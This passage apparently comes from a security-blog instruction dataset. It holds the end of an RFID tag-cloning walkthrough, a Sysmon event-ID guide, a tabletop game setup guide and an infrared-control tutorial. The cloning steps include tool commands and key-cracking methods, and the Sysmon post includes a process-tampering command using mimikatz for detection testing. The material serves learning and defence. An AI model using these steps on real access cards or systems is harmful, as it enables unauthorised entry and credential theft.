attempt to authenticate all sectors using a table of default keys will be performed As can be seen by the screenshot below keys were found for all sectors of the KeyWe tag except for sector 10 At this point the process continues with a hardnested brute force attack to determine guess the two remaining keys A B As per the screenshot below we can see that Key A was found and data read with Key-A revealed Key-B Now that all sectors have been authenticated the keys will be dumped into the file As can be seen below sector 10 contains blocks 40 43 and the key that authenticates the sector for read write is 9b7c25052fc3 Sector 0 comprised of blocks 0 3 contain the UID followed by BCC checksum SAK card type ATQA and Manufacturer Info Replace KeyWe RFID tag with Blank Chinese Mifare card Executing nfc-mfclassic w b mykeywecard.mfd pulls the data keys dumped to the file mykeywecard.mfd and writes this information to the target card Examining the screenshot more closely shows that 63 of 64 blocks written This is because sector 0 is read-only Although we are using a Chinese Magic Card it is a Gen-1 generation one card and requires a special unlock command 0x43 0x40 to be sent prior to writing block-0 As can be seen the factory set UID of the magic card 6d 94 94 3d has not been modified Had we used a Gen-2 card we would be done cloning Fortunately we can issue the unlock command by executing nfc-mfsetuid 018a4454 This will modify the magic card UID to reflect the KeyWe tag's UID of 01 8a 44 54 We now have a working copy of the original KeyWe RFID tag Cost effective learning option Fortunately experimenting and understanding RFID technology can be accomplished by utilizing an extremely inexpensive Arduino Nano board with an RFID-RC522 reader writer circuit board and a couple of open-source Arduino sketches There is an enormous number of practice labs complete with sketches and wiring diagrams available for learning the basics After examining quite a few of these options myself I've decided to include a couple of my favorites for this write-up Arduino Nano v3 with RFID-RC522 cost 8 ww.arduino.cc en software ithub.com miguelbalboa rfid Arduino rfid library DumpInfo sketch dumps the contents of a Mifare Classic card to a serial console ReadAndWrite sketch demonstrates reading some data modifying and writing it back and verify arduino_code_for_rfid_reader sketch demonstrates using an RFID card or tag for access control authentication I've included a color-coded diagram of my hardware setup above as well as a few pictures below in order to make assembly quick and easy Example 1 Read Card and Dump Info to serial port In the above example all of the sectors except sector 0 below contain the same info Example 2 The following Arduino sketch ReadAndWrite reads a card or tag into memory writes some test data to sector 1 block 4 and then performs another read to verify the data has changed Example 3 The following short Arduino sketch arduino_code_for_rfid_reader reads a card or tag to obtain the UID and verifies that the owner is authorized access by comparing it to a legitimate UID within the code In this example the legitimate access UID is 75 56 33 3D Android Tools to clone Mifare 1k Classic cards It is also entirely possible to use an NFC compliant Android phone to successfully read write and copy Mifare RFID cards and tags There are many apps available to download from Google Play Store In my opinion two of the more popular apps are NFC Tools developed by wakdev and MIFARE Classic Tool developed by ikarus23 NFC enabled phones can ONLY read passive high-frequency RFID 13.56MHz cards and tags and they must be read at an extremely close range typically within a few centimeters Simply holding a high-frequency Mifare card to the underside of an NFC enabled phone will prompt you to choose from existing apps or tools currently available on your phone see below Choosing NFC Tools would display the results of reading the card MCT Mifare Classic Tool It's relatively easy to clone a Mifare Classic card using the MCT Mifare Classic Tool ithub.com ikarus23 MifareClassicTool Available for download at Google Play Store Important information To successfully write to sector 0 the target Chinese Magic Card must be a Gen-2 version card Gen-1 cards require an unlock code 0x43 0x40 to be sent for writing sector 0 and MCT does not send unlock codes for sector 0 writes Using the MCT mobile app to clone Following the steps shown below we can clone Mifare Classic cards and tags using any NFC compatible android phone no iOS support at the time of this writing For this example our source card will be Mifare 1k Classic card with UID 0EFF84C1 and our target card will be Chinese magic card Gen-1 with UID 60FA353D Open App and place source card against the underside of your NFC enabled phone Read Source by tapping READ TAG followed by START MAPPING AND READ TAG Edit Dump by tapping sector 1 change first 6 bytes from 000000 to 123456 place target card against the underside of your phone Write Target by tapping the 3 dots drop-down menu and select WRITE DUMP WRITE DUMP OK START MAPPING AND WRITE DUMP Read Verify Target by tapping READ TAG followed by START MAPPING AND READ TAG Notice that although we successfully changed the bytes in sector 1 the source UID did not get written to sector 0 due to our target card being a Gen-1 magic card Many times the UID of the card will be verified before allowing access or confirming the legitimacy of the card In this case to complete this clone we can use the NFC ACR122U Reader Writer mentioned earlier to issue nfc-mfsetuid 0eff84c1 and change the UID of the target card to be that of the source card Likewise we could have also used a Gen-2 magic card to begin with It should also be mentioned that we did not have any missing keys in our example Had there been encryption keys that MCT was not aware of writing to those specific sectors would fail There are a few ways around this issue If we already know the keys we can enter them into a keys file within MCT As shown in the diagram above we can click EDIT ADD KEY FILE std.keys and tap to enter edit our known keys Alternatively we could create a text file containing our keys and enter them into MCT by clicking TOOLS IMPORT EXPORT FILES IMPORT KEYS Finding unknown keys If the missing keys are not known there are open source Linux-based tools MFCUK and MFOC available to brute force attack and guess the key s These tools provide two methods for cracking encryption keys on a MIFARE Classic smart card Note These tools as well as many other useful tools are available for download at ithub.com nfc-tools MFCUK also known as the Darkside Attack uses flaws in the pseudo-random number generator PRNG and error responses of the card to leak partial bits of the keystream to eventually obtain one of the sector keys This attack is only used if not a single key is known for any given sector on the MIFARE Classic card While this is a rare occasion it does happen and this attack can take literally hours to complete Basically the main goal is to find one key using MFCUK and then move on to the other attack method MFOC MFOC also known as the nested attack first authenticates to a sector using a known key whether that be a default key or one found from MFCUK to then perform a nested authentication to the other sectors In this process some bits of the keystream can be leaked and eventually the entire key can be recovered This is then performed for all unknown keys and eventually to a point where all of the keys are known Once all keys are known the card can then be completely duplicated or cloned Summary This has proved to be a very rewarding research project and has provided me with a much deeper understanding of RFID in general and the tools available to explore the many facets of contactless technology In particular my research exposed potential areas of vulnerability with HID low frequency 125kHz 26-bit proximity cards and tags The absence of security on these cards makes it extremely easy to clone these cards and impersonate the owner thereby gaining access to areas normally off-limits Unfortunately in my opinion there is no easy fix for this short of expensive mass upgrades of their existing equipment readers and access control panels redistribution of new RFID cards and extensive changes to existing back-end software For this reason many businesses opt to remain status quo until situations arise that warrant the costly upgrades Even the Wiegand protocol used for communicating with the access control back-end is based on old 1980's technology Furthermore the evolution of MIFARE 1k Classic high frequency 13.56MHz cards as a means to provide the security lacking in the older HID technology fell short of its delivery when it's proprietary Crypto1 algorithm was ultimately compromised Fortunately for NXP the MIFARE design provides a means to improve on security going forward as demonstrated by their MIFARE Plus MIFARE DESFire and MIFARE EV1 cards RFID technology has been around for a long time and is constantly evolving offering even better security greater data storage capacity and more robust features In my opinion contactless cards tags and badges will be around for many more years to come For me this has proven to be a fascinating and highly enlightening study of a surprisingly often overlooked wireless technology RFID devices are everywhere used for security clearance hotel rooms public transportation parking garages debit and credit cards anti-theft devices tracking assets and people and much more The technology can be found in schools and universities libraries law enforcement retail businesses hospitals and healthcare industries government agencies and on and on In closing I'll add the focus of this write-up was to not only document my research of RFID technology in"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Sysmon Event ID Breakdown - Updated to Include 29!!</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale, Sysmon</taxonomies>\n<creation_date>Fri, 08 Jan 2021 13:17:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale UPDATES October 30 2023There's been an additional update for Sysmon Event ID 29!Another Event ID EID was added to the Sysmon service This event ID followed the same incremental ID scheme and landed on EID29 Like the previous update this update has been echo'd to the end of this article December 22 2022 So there have been some changes to Sysmon and this blog needed polishing The latest Event IDs and descriptions are now included for Sysmon 26 File Delete Detected Sysmon 27 File Block Executable and Sysmon 28 File Block Shredding All you have to do is keep scrolling the new events have been added in this blog's format under the event ID number's heading and description tl dr This blog is being provided to demonstrate the capabilities of Sysmon logging broken down by event ID The IDs will be captured in context and matched to their sysmon-modular configuration section for tuning opportunities Please allow me a shout out here to the author of the sysmon-modular repository on Github Olaf has graciously provided the community one of the best tuning platforms and rapid configuration file deployment tools available for Sysmon what this is will be explained First tho olafhartong falconforceteam github.com olafhartong sysmon-modular So what is a Sysmon configuration file The config file for short provides the directives that govern exactly what Sysmon writes to logs Take for example the following selection of the configuration file I built with sysmon-modular for this article Event ID 1 Process Creation The previous configuration directive states that under Event ID 1 Process Creation one of the listed images must be matched This is not even close to the complete list of image names listed under modular's Event ID 1 config block The selection is intended to demonstrate the capability of sysmon modular So let's install Sysmon and review And let's have bitsadmin attempt a file download for us The simple instantiation of a bitsadmin command caused the following match from the previous screenshot If you take a moment and scroll back up to the modular configuration you should notice another interesting tidbit Each image's configuration section includes a potential MITRE ATT CK map As shown below and matched above use of the Bitsadmin.exe image matches against T1197 BITS jobs ttack.mitre.org techniques T1197 Event ID 2 Process Changed a File Creation Time Event ID 2 has not been useful in my experience though is probably useful for forensic investigators The technique is called Timestomping and the articles listed below include the MITRE page and a SpectreOps article that has a PoC The final item of note here is that the modular repo is referencing MITRE T1099 which has been deprecated in lieu of T1070.006 The parent technique is now Indicator Removal on Host with the sub-technique being timestomp More on this another day in a different blog Links osts.specterops.io revisiting-ttps-timestomper-622d4c28a655 ttack.mitre.org techniques T1070 006 Event ID 3 Network Connections Event ID 3s are for documenting network connections The established image names and connection types from the modular configuration then result in mapped techniques In the following screenshot we can see an RDP connection from a workstation to another IP off-subnet While this is a benign connection we do see the MITRE ATT CK technique mapped to T1021 remote services Event IDs 4 5 Sysmon Service Changes Event ID 4 is not filterable This is reported in the event of a Sysmon service state change Sysmon event ID 5 appears to be a rare event I was able to trigger this event by restarting the Sysmon service Based on a review of the modular configuration file the images had to be loaded and unloaded from userland temp or Windows temp Event ID 6 Driver Loaded Event ID 6 was also rare It is described as Driver Loaded and systems on this particular network had reported no Sysmon event ID 6's in the last 24 hour period Event ID 7 Image Loaded Event ID 7 covers image load operations and the processes that instantiate them This event was mapped to T1073 DLL Side-Loading which has been deprecated in lieu of T1574.002 The parent technique in this instance is Hijack Execution Flow with the sub-technique listed as DLL Side-Loading Link ttack.mitre.org techniques T1574 002 While technically MS Defender is side-loading a DLL this is a great opportunity for introducing the theory of event tuning In this situation we should review the modular configuration directories structure and make sure we understand how sysmon-modular was designed to handle this exact situation Take the following screenshot which has both an exclude and an include statement these must exist in separate RuleGroups To exclude the MpCmdRun.exe image from the event ID 7 configuration block we had to create a completely new RuleGroup otherwise on config file update an error would be thrown Another item of note is that there is no explicit Event ID configuration section the rules are processed by the listings that we can match against the sysmon operational log shown below For example to create new RuleGroups for the identified rules we would use syntax similar to the following Event ID 8 CreateRemoteThread Moving on now to event ID 8 CreateRemoteThread This event ID was also rare but had occurred once each day on the system being analyzed for this blog One of the events was a graphics driver The other event was worthy of investigation and appeared as follows Event ID 9 RawAccessRead Event ID 9 is listed as RawAccessRead events Randy Franklin Smith ultimatewindowssecurity.com fame describes this event as being reported when a process conducts reading operations from the drive using the denotation After further reading this is what is listed on the Sysinternals site for sysmon as well No event ID 9s had been reported by this system Links ww.ultimatewindowssecurity.com securitylog encyclopedia event.aspx?eventid 90009 ocs.microsoft.com en-us sysinternals downloads sysmon Event ID 10 ProcessAccess Event ID 10 is a very interesting event and is listed as ProcessAccess This occurs when an image requests a priv to access another process As shown in the next screenshot MS Defender asked to take a quick peek at LSASS and the system granted the appropriate access Link yberwardog.blogspot.com 2017 03 chronicles-of-threat-hunter-hunting-for_22.html Event ID 11 File Creation Events Event ID 11 covers file creation events This can be very useful in detections forensics and investigations With some basic creation rules in place Sysmon EID11 can provide an early warning system for write operations in userland Quick stepback here to provide a definition for userland Userland or user space noun In the context of computing this can refer to all code that runs in low privilege processes outside admin or kernel context For restrictive environments users should have limited privilege to write to a workstation's disk normally locations including C users username or in some cases redirected user locations to network shares As shown in the next screenshot .bat and .cmd file creation events are logged to disk The creation of both a .cmd and .bat file are then logged to disk Event IDs 12 13 14 Registry Objects These event IDs are related to registry events RegObject added deleted HKLM HKU RegValue set DWORD QWORD additions RegObject renamed A selection of the configuration parameters for the registry related events is shown below Event IDs 12 and 13 were relatively common and likely need some tuning I did not see event ID 14 during the creation of this blog Event ID 15 FileCreateStreamHash Event ID 15 covers events related to file streams generally downloads via web browser As shown below we see chrome.exe download the build_collector.py file from the CrackMap archives Note the zone.identifier file highlighted in the event content referred to in the Sysinternals page for sysmon as the mark of the web A PowerShell download was not caught with this particular event ID but could have been captured with Event ID 11 had the configuration file been properly tuned to catch .zip files Event ID 16 Sysmon Config Change A very simple event ID to interpret is EID16 Sysmon Config Change Event IDs 17 and 18 Pipe Events These event IDs are related to Pipe Events Event ID 17 Pipe Created Event ID 18 Pipe Connected Pentest tools malware tools and lots of other software often utilize the SMB protocol Pipes are a means over which an SMB client can establish a connection to a remotely available process There is clearly some value in monitoring these events Sysmon modular's configuration for these event IDs is an exclude first operation Some common pipe event offenders are listed in the resultant config file shown below Links ocs.microsoft.com en-us dotnet standard io how-to-use-named-pipes-for-network-interprocess-communication ook.hacktricks.xyz pentesting pentesting-smb Event IDs 19 20 21 WMI Events EID19 WMIEventFilters EID20 WMIEventConsumer EID21 WMIEventConsumertoFilter WMI events can be noisy and will depend on the environment Enabling full logging of WMI can cause a lot of logs The default configuration parameters for modular are to include events where any of the EventFilters EventConsumers or EventConsumertoFilters are listed as created in the produced event content I was unable to generate a matching event using the command line in an attempt to have wmic open a command shell It is probable that Olaf has implemented the best possible solution for the noise of WMIC and related events Additional investigations may be warranted though at this time capturing WMI events in this fashion is recommended Link edcanary.com threat-detection-report techniques windows-management-instrumentation Event ID 22 DNSEvents DNS events are useful and when coupled with event ID 3 network connection and file write events can help produce a complete picture However .like a lot of things on a network these can be very noisy The modular approach to this has been to exclude known domains and log the rest About 20 of the logged Sysmon events on this lab system were EID22 so clearly this event is up for review as to its usefulness In the grand scheme of logging threat hunting ETW investigations etc I might err here on the side of relying on my resolver's logs proxy-based defenses and its logging capabilities rather than on the endpoint Event ID 23 FileDelete Another really cool addition to the Sysmon event family was this one As a forensic investigator might say show me the malware A lot of hackers clean up after themselves and this tool allows us the opportunity to retain archival copies when files are created in defined spaces userland and are subsequently deleted thus event ID 23 FileDelete This event was harder to trigger than I'd imagined prior to reviewing the structure of sysmon modular's config Let's review for example the Downloads section of the config I tried to create files that matched these extensions caught by EID 11 and then delete them This did not result in the expected events After reviewing these groupRelation configuration parameters it appeared that the logical and operator was the issue After modifying the config file and updating the local operating installation I was able to trigger EID23 under these defined conditions As of December 28 2020 the modular repo could use a pull request to fix this logical flaw The fix appeared to be as simple as shown below or not and A selection of the filtered event logs are shown below And finally the files deleted from userland were copied to the RestrictedContainer as directed by the Sysmon configuration Event ID 24 Clipboard Changes This event was initially reviewed with skepticism since...well copies of the contents of the clipboard may end up in another archive location This content will include passwords and other sensitive materials so caution should be taken to implement this Event ID 25 Process Tampering Sysmon version 13 added process tampering to address Johnny Shaw's process herpaderping technique based on hollowing etc To confirm this would catch the technique after compiling the project I used the compiled ProcessHerpaderping.exe file and executed it As shown in the previous screenshot I used ProcessHerpaderping.exe with the mimikatz.exe to build a file called sysmon.exe stuffed with lsass.exe's signature bits This results in capture We can all catch process tampering now But let's take a quick look at the reverse of this process First we reviewed the Event ID 25 Process Tampering But the first event Event ID 1 caught a process creation event As shown below we also see the partial command line Possible IOC Sorry about the next screenshot for readability's sake I cropped it but whole command here ProcessHerpaderping.exe mimikatz.exe sysmon25.exe C Windows System32 lsass.exe We also see the .exe created by this process in the Event ID 11 File Creation Looking at the event viewer it is clear that some flags went off prior to execution and at a minimum we should be able to help the forensics team sort out what happened Well there is one more Event ID 26 File Delete Detection Let's say the adversary wanted to cover their tracks by deleting their artifacts This Event ID strikes me as an either or EID23 file delete archive or EID26 file delete Really you could grow your archive location to an obscene size if you are archiving everything But maybe that is exactly what you want If so go with Event ID 23 and archive the deletions that match your config file's logic Otherwise if all you want to know is when users delete matching files go with Event ID 26 Event ID 27 File Block Executable This is one of my favorite additions to the Sysmon engine Incredibly articulate answer to a basic problem We don't want our users downloading exe's from the Internet The following config file chunk accomplishes blocking exe's downloaded to c users Downloads thanks Olaf H T on the wildcard Please note the config chunk below covers config changes necessary for EID 27 and EID 28 Let's assume I try to download a file from the Internet like Chrome.exe Denied Game over Easy peasy We have discussed userland and write permissions administrative access and lots of related topics Let's boil this down to this users should have limited permissions to write to their local systems The better your userland configuration is the easier this protection will be to implement By limiting write privileges on disk you have also narrowed your optics focus in Sysmon This demo relied entirely on the default browser configuration downloading the .exe to C users someuser Downloads and could be easily bypassed Limit write access and configure those locations for denial with Sysmon Event ID 28 File Block Shredding This is the latest event ID added to Sysmon and was designed to deny shredding tools like sdelete from thrashing files on disk As an example shown below we see the adversary trying to shred the malicious Firefox Installer.exe file from the downloads directory Sysmon stepped in here and denied the operation In event logs we see the following Sysmon blocked the shredding operation Event ID 29 File Block Executable This event ID was designed to capture executables specifically PE format type which includes EXE's DLL's and object code The configuration file will also need to be updated and as always Olaf and Falcon Force have the bits needed to understand proper implementation In testing we had to add a chunk under the bits to cover userland at c users We tested three specific conditions We tested a file download with Edge which got caught We tried to copy a file over an RDP session with Explorer and got caught Finally we also used PowerShell to move a copied file to a new name And....we got caught In summation this addition will provide another opportunity for high-level visibility into the end user environment and what they might be up to at any given point While noise was limited due to the amazing work implemented in the Sysmon Modular framework our recommendation will remain implement first and work through your log noise reduction strategies later Well there is one more Event ID 255 Errors And that's it It was a long journey to get here and I'd like to thank a few folks who made this possible bhinfosecurity for a platform strandjs for all the support olafhartong for modular markrussinovich for Sysmon Happy hunting"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Backdoors & Breaches - Tabletop Simulator Guide</title>\n<taxonomies>Backdoors & Breaches, Fun & Games, How-To, Informational</taxonomies>\n<creation_date>Mon, 15 Mar 2021 19:11:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Edward Miro Backdoors Breaches is now available as an official Workshop Mod for Tabletop Simulator Backdoors Breaches B B contains 52 unique cards to help you conduct incident response tabletop exercises and learn attack tactics tools and methods This post is a guide for getting a virtual B B game going Note New attack defense and inject cards will be added periodically This is a multi-step process but it's not difficult Our mod is built with Tabletop Simulator TTS and is hosted on the TTS Workshop TTS runs on the Steam Platform Note this guide is designed for Windows users but you can do the same on Mac or Linux TTS and the B B mod work on any platform ackdoorsandbreaches.com What you will learn from this guide How to install SteamHow to install Tabletop Simulator TTS How to access the Backdoors Breaches modSome gameplay basics to get you started How to install Steam If you don't already have Steam installed that's okay It's super easy to get and free to install Head over to tore.steampowered.com Now click Install Steam in the upper right-hand corner On the next screen click Install Steam Save the 'SteamSetup.exe file then run the installer Select your language choose an install location and at the end click 'Finish to run Steam At this point either sign in with a previously made account or click 'CREATE A NEW ACCOUNT to make a new account Once your account is set up and you're logged into Steam then proceed to the next step How to install Tabletop Simulator From the main 'Steam menu search using the 'search the store search box in the upper left for 'Tabletop Simulator It should be the first result and will look like this Now just 'Add to Cart and after purchasing you will need to purchase TTS but the B B mod will be a free workshop subscription ...it will be added to your 'LIBRARY Double-click it and then select 'Play Tabletop Simulator to open TTS if you have a vr rig this is also supported Now you're ready for the last step How to access the Backdoors Breaches mod In your browser head to teamcommunity.com sharedfiles filedetails ?id 2401033477 Note if that doesn't work you can also access the TTS Workshop directly and search 'BHIS in the search box Click on 'Subscribe at the bottom to add the B B mod to your saved Workshop games You can now go back to Tabletop Simulator Click on 'CREATE to start a new game Select either 'Singleplayer Multiplayer or Hotseat Singleplayer will be just for you Multiplayer allows you to host a game to play with other people who have Tabletop Simulator and Hotseat allows you to play multiplayer with the same computer For this walkthrough I'll be selecting Singleplayer From the 'GAMES menu we will then select 'Workshop If you're new to TTS your 'WORKSHOP menu should look like this If not you can type 'BHIS in the search box to filter the items Click on 'BHIS Backdoors Breaches then 'Load and you're in Some gameplay basics to get you started Tabletop Simulator Knowledge Base Controls Movement Want to see the Backdoors Breaches Tabletop Simulator in action outu.be NVZ_ihwVQjY?t 661"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using Infrared for Hardware Control</title>\n<taxonomies>Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Fri, 02 Apr 2021 16:58:17 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Overview Infrared technology has been around for a very long time and is a wireless technology used in devices that convey data by way of Infrared radiation Infrared is electromagnetic radiation EMR with a wavelength just beyond the visible light spectrum Inasmuch Infrared can not be seen by the naked eye Fun fact Although Infrared can not be seen by our eyes the camera on your phone can capture and display these transmissions just fine As you are probably aware Infrared technology is used in a great number of applications such as thermal Imaging cameras medical applications military applications target acquisition night vision etc heating and cooling and computer peripheral communication just to name a few The goal of this write-up is to show just how easy it is to not only capture Infrared communication but also to replay the transmission Initially I'll show how I was able to capture the IR signals of a couple of remotes I had laying around the house using Infrared tools available in most Linux repos Hacking Infrared television remote controls might seem a bit impractical at first glance however it can be done very easily and costs practically nothing to accomplish The wealth of information regarding the Infrared process is most definitely worth the effort As part of my research I decided to capture the Infrared button presses of a Kodi open source media player remote an Arduino generic remote and an HDMI switch remote I was amazed at how quick and easy it was to retrieve this data Objectives Getting familiar with the NEC IR protocol Using a Raspberry Pi and Linux drivers to detect and transmit IR remote codes Using IR and Mega2560 module to control relays IR Protocols general info In general an IR Protocol is a set of rules that specify how to transmit a group of bits or bytes There is a transmitting device IR emitter diode which sends these pulses at a specific frequency for a specific amount of time and then pauses for a specific amount of time Each bit 0 or 1 is encoded with a specified combination of these timings which in turn allows for the IR receiver to properly read the transmission There are quite a few Infrared protocols but three of the more popular follow NEC is a well-known protocol and perhaps is the most widely used It was developed by NEC and has been adopted by many companies Its waveform is made of a start frame a bitstream and an end of message terminator The NEC IR transmission protocol uses pulse distance encoding of the message bits Each pulse burst is 562.5\u00b5s in length at a carrier frequency of 38kHz Logical bits are transmitted as follows Logical '0 a 562.5\u00b5s pulse burst followed by a 562.5\u00b5s space with a total transmit time of 1.125ms Logical '1 a 562.5\u00b5s pulse burst followed by a 1.6875ms space with a total transmit time of 2.25ms When a key is pressed on the remote controller the message transmitted consists of the following in order 9ms leading pulse burst 16 times the pulse burst length used for a logical data bit 4.5ms space 8-bit address for the receiving device 8-bit logical inverse of the address 8-bit command 8-bit logical inverse of the command final 562.5\u00b5s pulse burst to signify the end of message transmission The four bytes of data bits are each sent least significant bit first SIRC is a proprietary protocol by SONY and three variants exist 12 15 or 20 bits In all variants the command field has a fixed length of 7 bits All the information bits are streamed least significant bit first 12-bit version 7 command bits 5 address bits 15-bit version 7 command bits 8 address bits 20-bit version 7 command bits 5 address bits 8 extended bits Pulse width modulation Carrier frequency of 40kHz Bit time of 1.2ms or 0.6ms PHILIPS RC5 RC6 PROTOCOL RC5 RC6 Manchester RC5 and RC6 are two different protocols by Philips both based on the Manchester coding Their carrier frequency is set at 36KHz with a recommended PWM duty cycle of 1 4 or 1 3 but not mandatory In Manchester coding the bit time is provided by a constant clock so both the values 1 and 0 take the same amount of time but in one case the pulse precedes the pause here this is a logical 0 in the other is the opposite here this is a logical 1 Transmitting and Receiving Infrared signals Using a Raspberry Pi and Linux IR drivers Getting familiar with transmitting and receiving Infrared communication can be accomplished fairly quickly using a Raspberry Pi with Raspbian Buster an Infrared Linux tool a few components TSOP38238 receiver 940nm emitter diode and 220-ohm resistor and some hookup wires Understanding the intricacies of the various protocols is not necessary as the work has been done for us within the Linux drivers Using ir-keytable a swiss-knife tool to handle Remote Controllers and the aforementioned circuit we can detect and decipher remote control button presses anpages.ubuntu.com manpages bionic man1 ir-keytable.1.html Customize config.txt As part of this configuration IR transmission is also configured If transmission is not needed exclude dtoverlay gpio-ir-tx gpio_pin 15 Some of the output might be different as a result Update config.txt variables pi rasp11 infra-red sudo nano boot config.txt BEGIN ADDED dtoverlay gpio-ir gpio_pin 14 dtoverlay gpio-ir-tx gpio_pin 15 END ADDED Reboot pi rasp11 infra-red sudo reboot Confirm gpio modules are loaded pi rasp11 infra-red lsmod grep gpio gpio_ir_recv 16384 0 List devices cat proc bus input devices I Bus 0019 Vendor 0001 Product 0001 Version 0100 N Name gpio_ir_recv P Phys gpio_ir_recv input0 S Sysfs devices platform ir-receiver e rc rc0 input4 U Uniq H Handle rs kbd event4 B PROP 20 B EV 100017 B KEY fff 0 0 4200 108fc32e 2376051 0 0 0 7 158000 4192 4001 8e9680 0 0 10000000 B REL 3 B MSC 10 Install ir-keytable pi rasp11 infra-red sudo apt-get install ir-keytable -y Confirm install pi rasp11 infra-red ir-keytable Found sys class rc rc0 dev input event4 with Name gpio_ir_recv Driver gpio_ir_recv table rc-rc6-mce LIRC device dev lirc0 Attached BPF protocols Operation not permitted Supported kernel protocols other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon Enabled kernel protocols lirc rc-6 bus 25 vendor product 0001 0001 version 0x0100 Repeat delay 500 ms repeat period 125 ms Test remote pi rasp11 infra-red sudo ir-keytable -p all Protocols changed to other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon Confirm IR Receiver device is working pi rasp11 infra-red sudo ir-keytable Found sys class rc rc0 dev input event4 with Name gpio_ir_recv Driver gpio_ir_recv table rc-rc6-mce LIRC device dev lirc0 Attached BPF protocols Supported kernel protocols other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon Enabled kernel protocols lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon bus 25 vendor product 0001 0001 version 0x0100 Repeat delay 500 ms repeat period 125 ms Notice device found as rc0 Note About rc0 and rc1 Normally the IR receiver is assigned to sys class rc rc0 However due to the nature of multi threaded device probe the receiver device can be assigned to sys class rc rc1 In the following notes when ir-keytable is called with -s rc0 and there is no response or an error use -s r1 If no -s is specified rc0 is default However due to the possibility of the receiver being assigned to rc1 during boot it is recommended to always specify -s In this way if the 'wrong device is used an error will appear Test remote with rc0 scan button presses loading all protocols pi rasp11 infra-red ir-keytable -t -s rc0 Testing events Please press CTRL-C to abort Sample readings on Kodi remote Captured codes of all three remote controls Hardware control using Infrared Using IR and Mega2560 module to control relays Generic remote control Sainsmart 4 channel relay module Mega2560 module For this project we'll be using an Elegoo Mega2560 R3 The Mega2560 is a microcontroller board based on the ATmega2560 It has 54 digital input output pins of which 15 can be used as PWM outputs 16 analog inputs 4 UARTs hardware serial ports and a 16 MHz crystal oscillator This module is comparable to an Arduino Uno on steroids and at the time of this writing reasonably priced at just under 40 It is compatible with most shields designed for the Uno and supports flash memory configuring with the Arduino IDE software environment For this demonstration I have chosen to attach LEDs to each of the four relays for a visual indication of relay closure It should be noted that the Sainsmart relays can be configured to control a vast variety of AC DC hardware such as lighting motors sensors etc and are limited only by the voltage current ratings of the relay chosen The module used in this demonstration is a four-channel 5-volt relay module capable of handling up to 10A 120VAC or 10A 28VDC Each relay provides a normally open or normally closed configuration I chose to use the normally open set of terminals LED's normally off Control of the four individual relays is pretty straightforward and shown below To engage a specific relay and activate its corresponding LED the specific input control pin IN1 IN4 needs to be pulled low GND Circuit diagram Using the Arduino IDE to flash the Mega2560 The following sketch will look for button presses on the Arduino generic remote Specifically this sketch will monitor for the 'power 'mute 'mode and 'play buttons codes 0x45 0x46 0x47 0x44 respectively and upon discovery will engage the corresponding relay channel IN1 IN4 to toggle the channel's LED Pins 39 37 35 and 33 on the Mega2560 are defined as output normally high and will be pulled low upon discovery of the specific IR code SainsmartIR.ino Arduino sketch to capture infrared codes and close open relays based on matching criteria Modified NeoPixel_IR sketch from Adafruit_CircuitPlayground using IRLibAll library Written to interface with Sainsmart 4 relay module Author R.F Felch 01 28 2021 include IRrecv myReceiver 11 receiver on pin 11 Arduino Uno IRrecv myReceiver 11 receiver on pin 32 Mega2560 IRdecode myDecoder Decoder object Arduino Uno int play 8 int mute 7 int mode 4 int power 2 Mega2560 int play 39 int mute 37 int mode 35 int power 33 Channel status false Relay open true Relay closed bool CH_1 false bool CH_2 false bool CH_3 false bool CH_4 false void setup pinMode power OUTPUT Relay channel 1 pinMode mode OUTPUT Relay channel 2 pinMode mute OUTPUT Relay channel 3 pinMode play OUTPUT Relay channel 4 Set channels high open relay digitalWrite power HIGH digitalWrite mode HIGH digitalWrite mute HIGH digitalWrite play HIGH Serial.begin 115200 Serial.println Scanning for IR codes myReceiver.enableIRIn Start the receiver void loop if myReceiver.getResults myDecoder.decode if myDecoder.protocolNum NEC Serial.println myDecoder.value uncomment to view captured values switch myDecoder.value case 0xffa25d Power Serial.println Power if CH_1 false digitalWrite power LOW close relay ch-1 if CH_1 true digitalWrite power HIGH open relay ch-1 CH_1 !CH_1 break case 0xff629d Mode Serial.println Mode if CH_2 false digitalWrite mode LOW close relay ch-2 if CH_2 true digitalWrite mode HIGH open relay ch-2 CH_2 !CH_2 break case 0xffe21d Mute Serial.println Mute if CH_3 false digitalWrite mute LOW close relay ch-3 if CH_3 true digitalWrite mute HIGH open relay ch-3 CH_3 !CH_3 break case 0xff22dd 